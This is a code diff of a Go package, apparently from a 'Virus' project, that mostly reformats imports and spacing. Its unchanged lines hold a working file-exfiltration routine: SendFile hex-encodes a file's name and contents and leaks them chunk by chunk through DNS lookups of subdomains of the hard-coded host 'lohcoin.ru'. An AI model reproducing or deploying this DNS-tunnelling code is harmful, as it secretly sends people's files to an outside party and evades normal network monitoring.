@@ -1,13 +1,14 @@
 package Resolver
 
 import (
-	"InfoSec/Virus/Scaner"
-	"os"
-	"fmt"
+	"client/Virus/Scaner"
 	"encoding/hex"
+	"fmt"
 	"net"
-	"golang.org/x/crypto/sha3"
+	"os"
 	"sync"
+
+	"golang.org/x/crypto/sha3"
 )
 
 const url = "lohcoin.ru"
@@ -40,13 +41,13 @@ func SendFile(path string) error {
 	filename := info.Name()
 	if len(filename) > maxSubdomainLength {
 		len := len(filename)
-		filename = filename[len -maxSubdomainLength: len]
+		filename = filename[len-maxSubdomainLength : len]
 		fmt.Println(filename)
 	}
 
 	resolve(hex.EncodeToString([]byte(filename)), prefix, 0)
 
-	for i := uint64(1);; i++ {
+	for i := uint64(1); ; i++ {
 		n, _ := file.Read(buffer)
 		encoded := hex.EncodeToString(buffer[:n])
 		resolve(encoded, prefix, i)
@@ -57,10 +58,8 @@ func SendFile(path string) error {
 	return nil
 }
 
-
 // resolve: forms host and resolves it
 func resolve(content string, prefix [28]byte, part uint64) {
 	host := fmt.Sprintf("%x.%063x.%s.%s", prefix, part, content, url)
 	net.LookupHost(host)
 }
-
